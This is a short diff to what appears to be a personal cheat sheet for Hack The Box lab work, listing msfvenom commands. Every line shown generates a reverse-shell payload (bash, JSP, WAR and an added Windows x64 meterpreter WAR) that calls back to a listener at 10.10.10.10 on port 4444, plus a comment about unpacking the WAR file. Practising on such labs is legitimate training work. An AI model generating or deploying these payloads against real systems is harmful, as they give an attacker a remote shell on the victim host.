@@ -9,3 +9,6 @@ msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/re
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/v-shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/v-shell.war
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o ~/htb/reverse-shell/v-shell2.war
+
+#unpack war file for jsp file
